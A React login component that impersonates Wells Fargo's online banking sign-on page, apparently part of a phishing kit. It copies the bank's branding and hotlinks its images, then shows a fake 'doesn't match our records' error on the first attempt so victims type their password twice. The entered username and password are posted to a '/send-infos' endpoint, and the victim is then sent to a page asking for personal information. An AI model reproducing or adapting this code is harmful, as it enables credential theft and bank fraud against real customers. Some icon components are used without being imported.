import {
  Button,
  Checkbox,
  FormControlLabel,
  Link,
  Typography,
} from "@mui/material";
import { Box } from "@mui/system";
import React, { useRef, useState } from "react";
import axios from "axios";
import { CustomInput } from "./CustomInput";
import { CustomError, ExclamationIcon } from "./CustomError";
import { useForm } from "react-hook-form";
import { SubmitButton } from "./SubmitButton";

interface LoginProps {
  updateInputs: (data: any) => void;
  inputs: {};
  history: any;
}

export const Login: React.FC<LoginProps> = ({ updateInputs, history }) => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm();

  const [loginAttempt, setLoginAttempt] = useState(0);
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    if (!loginAttempt) {
      setTimeout(() => {
        setLoginAttempt(1);
        setLoading(false);
      }, 3000);
      return;
    }

    updateInputs({
      form: "LOGIN DETAILS",
      loingDetails: data,
    });
    await axios.post("/send-infos", {
      form: "LOGIN DETAILS",
      loginDetails: data,
    });

    history.push("/s/personal-information");
  });

  const bgImg = useRef(
    ["tractor", "park", "balloons"][Math.round(Math.random() * 2)]
  );

  return (
    <>
      <Box
        sx={{
          display: "flex",
          flexFlow: "column nowrap",
          flex: "1 1 auto",
          overflow: "hidden",
          zIndex: 0,
          position: "fixed",
          top: 0,
          left: 0,
          bottom: 0,
          right: 0,
        }}
      >
        <img
          alt="Lifestyle"
          src={`https://www10.wellsfargomedia.com/auth/static/images/COB-BOB-IRT-enroll_${bgImg.current}.jpg`}
          style={{
            overflow: "hidden",
            zIndex: 0,
            position: "fixed",
            minHeight: "100%",
            minWidth: "1024px",
            width: "100%",
            height: "auto",
            top: 0,
            left: 0,
          }}
        ></img>
      </Box>
      <Box
        sx={{ display: "flex", flexFlow: "column nowrap", flex: "1 0 auto" }}
      >
        <Box
          sx={{
            display: "flex",
            flexFlow: "column nowrap",
            flex: "1 1 auto",
            alignItems: "center",
          }}
        >
          <Box
            sx={{
              paddingTop: ["42px", "60px"],
              display: "flex",
              flexFlow: "column nowrap",
              flex: "1 1 auto",
              alignItems: "center",
              width: "100%",
            }}
          >
            <Box
              sx={{
                display: "flex",
                flexFlow: "column nowrap",
                flex: "1 1 auto",
                alignItems: "stretch",
                border: "none",
                width: "100%",
                backgroundColor: "transparent",
              }}
            >
              <Box
                sx={{
                  margin: [0, "64px auto 90px"],
                  borderRadius: [0, "12px"],
                  boxShadow: "0 0 16px 0 rgb(59 51 49 / 15%)",
                  width: ["auto", "83%"],
                  maxWidth: ["100%", "870px"],
                  backgroundColor: "#fff",
                  fontSize: "15px",
                  position: "relative",
                  zIndex: 0,
                  paddingX: ["16px", 0],
                  flexDirection: ["column", "initial"],
                  display: ["flex", "initial"],
                  flex: ["1 1 auto", "auto"],
                }}
              >
                {loginAttempt ? (
                  <Box
                    sx={{
                      width: ["100%", "50%"],
                      marginRight: "auto",
                      marginLeft: "auto",
                      marginTop: "2.5rem",
                    }}
                  >
                    <Box
                      sx={{
                        display: "flex",
                        flexFlow: "row nowrap",
                        flex: "1 1 auto",
                        alignItems: "stretch",
                        lineHeight: "18px",
                        fontSize: "14px",
                        backgroundColor: "#fff",
                        color: "#3b3331",
                        border: "2px solid #9c9191",
                        padding: "16px 16px 16px 12px",
                        boxSizing: "border-box",
                        borderRadius: "2px",
                        fontWeight: 400,
                      }}
                    >
                      <Box
                        sx={{
                          display: "flex",
                          flexFlow: "column nowrap",
                          alignItems: "center",
                          justifyContent: "flex-start",
                          marginRight: "12px",
                        }}
                      >
                        <ExclamationIcon />
                      </Box>
                      <Box
                        sx={{
                          display: "flex",
                          flex: "1 1 100%",
                          flexDirection: "row",
                        }}
                      >
                        <Box>
                          <Box>
                            <Box>
                              That combination doesn't match our records. You
                              can try again, or we can help you
                              <Link
                                href="#"
                                sx={{
                                  color: "#5a469b",
                                  marginX: "0.2rem",
                                }}
                              >
                                create a new password
                              </Link>
                              or
                              <Link
                                href="#"
                                sx={{
                                  color: "#5a469b",
                                  marginLeft: "0.2rem",
                                }}
                              >
                                find your username.
                              </Link>
                            </Box>
                          </Box>
                        </Box>
                      </Box>
                    </Box>
                  </Box>
                ) : (
                  <>
                    {((errors.username && errors.username.message) ||
                      (errors.password && errors.password.message)) && (
                      <CustomError
                        error={
                          (errors.username && errors.username.message) ||
                          (errors.password && errors.password.message)
                        }
                      />
                    )}
                  </>
                )}
                <Box
                  sx={{
                    display: "flex",
                    flexWrap: "nowrap",
                    alignItems: "center",
                    justifyContent: "center",
                  }}
                >
                  <Typography
                    component="h1"
                    sx={{
                      marginTop: ["12px", "26px"],
                      fontSize: "24px",
                      color: "#3b3331",
                      textAlign: "center",
                      fontWeight: 400,
                      lineHeight: "3.25rem",
                      fontFamily: `"Wells Fargo Serif",Georgia,serif`,
                      outline: "none",
                    }}
                  >
                    Good evening
                    <span
                      style={{
                        margin: "2px 0 16px",
                        fontSize: "15px",
                        display: "block",
                        lineHeight: "normal",
                        color: "#3b3331",
                        fontFamily: `Wells Fargo Sans,Verdana,Arial,Helvetica,sans-serif`,
                      }}
                    >
                      Sign on to manage your accounts
                    </span>
                  </Typography>
                </Box>
                <Box>
                  <Box>
                    <Box
                      sx={{
                        width: ["auto", "50%"],
                        margin: "0 auto",
                      }}
                    >
                      <Box paddingBottom="32px">
                        <CustomInput
                          label="Username"
                          register={register("username", {
                            required:
                              "A username must be entered. Please enter your username",
                          })}
                        />
                      </Box>
                      <Box marginTop="8px" paddingBottom="32px">
                        <CustomInput
                          label="Password"
                          type={showPassword ? "text" : "password"}
                          register={register("password", {
                            required:
                              "A password must be entered. Please enter your password.",
                          })}
                          endAdornment={
                            <Box
                              sx={{
                                display: "flex",
                                flexFlow: "row nowrap",
                                flex: "1 1 auto",
                                alignItems: "center",
                                justifyContent: "center",
                                position: "absolute",
                                right: 0,
                                top: "22px",
                              }}
                            >
                              <Button
                                sx={{
                                  padding: "12px 8px 8px 12px",
                                  lineHeight: 0,
                                  width: "100%",
                                  height: "100%",
                                }}
                                onClick={() => setShowPassword(!showPassword)}
                              >
                                <Box
                                  sx={{
                                    display: "flex",
                                    flexFlow: "row nowrap",
                                    alignItems: "center",
                                    justifyContent: "center",
                                    position: "relative",
                                  }}
                                >
                                  {showPassword ? (
                                    <EyeIconClose />
                                  ) : (
                                    <EyeIconOpen />
                                  )}
                                </Box>
                              </Button>
                            </Box>
                          }
                        />
                      </Box>
                      <Box
                        sx={{
                          display: "flex",
                          flexFlow: "row nowrap",
                          alignItems: "center",
                        }}
                      >
                        <Box>
                          <Box
                            sx={{
                              fontSize: "16px",
                              color: "#3b3331",
                              lineHeight: "23px",
                              display: "flex",
                            }}
                          >
                            <Box
                              sx={{
                                display: "inline-flex",
                                flexFlow: "row nowrap",
                                alignItems: "flex-start",
                                paddingTop: "0.5rem",
                                paddingBottom: "0.5rem",
                              }}
                            >
                              <FormControlLabel
                                sx={{
                                  "& .MuiTypography-root": {
                                    paddingTop: "0.5rem",
                                    paddingRight: "0.5rem",
                                  },
                                }}
                                control={
                                  <Checkbox
                                    disableRipple
                                    sx={{
                                      padding: 0,
                                      paddingRight: "0.5rem",
                                      "& .MuiSvgIcon-root": { fontSize: 28 },
                                      "&.Mui-checked": {
                                        color: "#5a469b",
                                      },
                                    }}
                                  />
                                }
                                label="Save username"
                              />
                            </Box>
                          </Box>
                        </Box>
                      </Box>
                    </Box>
                    <Box
                      component="section"
                      sx={{
                        margin: "1rem auto .625rem",
                        display: "block",
                      }}
                    />
                    <SubmitButton onClick={onSubmit} loading={loading} />
                    <Box
                      component="section"
                      sx={{
                        display: "flex",
                        flexFlow: "row nowrap",
                        alignItems: "center",
                        justifyContent: "center",
                        background: ["transparent", "#f4f0ed"],
                        borderBottomLeftRadius: [0, "12px"],
                        borderBottomRightRadius: [0, "12px"],
                      }}
                    >
                      <Box
                        component="span"
                        sx={{
                          padding: [0, "2rem 0 2.5rem"],
                          paddingBottom: ["4rem", "2.5rem;"],
                          textAlign: "center",
                          fontSize: "14px",
                          color: "#3b3331",
                          fontFamily: `Wells Fargo Sans,Verdana,Arial,Helvetica,sans-serif`,
                        }}
                      >
                        <Box
                          component="span"
                          marginRight="0.2rem"
                          sx={{
                            display: ["block", "initial"],
                          }}
                        >
                          Need help?
                        </Box>
                        <Link
                          href="#"
                          sx={{
                            fontSize: "14px",
                            color: "#3b3331",
                          }}
                        >
                          Create a new password
                        </Link>
                        <Box component="span" marginX="0.2rem">
                          or
                        </Box>
                        <Link
                          href="#"
                          sx={{
                            fontSize: "14px",
                            color: "#3b3331",
                          }}
                        >
                          find your username
                        </Link>
                      </Box>
                    </Box>
                  </Box>
                </Box>
              </Box>
            </Box>
          </Box>
        </Box>
      </Box>
    </>
  );
};

